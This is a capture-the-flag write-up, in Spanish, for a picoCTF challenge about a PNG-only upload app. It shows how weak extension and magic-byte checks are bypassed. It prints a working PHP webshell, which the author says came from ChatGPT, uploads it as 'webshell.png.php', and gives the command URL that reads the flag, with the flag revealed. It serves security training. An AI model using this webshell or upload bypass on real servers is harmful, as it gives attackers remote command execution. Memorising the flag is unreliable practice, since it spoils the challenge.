
## Description

I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.

## Solution

Primero nos vamos al archivos robots.txt a ver que pista existe:

```
Nos aparece esto:
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

Vamos al archivo instructions.txt a ver que sale:

```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

Le pedimos a chatgpt un webshell sencillo, y lo guardamos en un archivo php.

```
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

Este web shell permite interactuar con el sistema operativo operativo de un servidor a través del navegador web, como si estuviera usando una terminal.
```

![[Pasted image 20250415161134.png]]


http://atlas.picoctf.net:59497/uploads/webshell.png.php?cmd=cat%20../HFQWKODGMIYTO.txt

flag-> picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}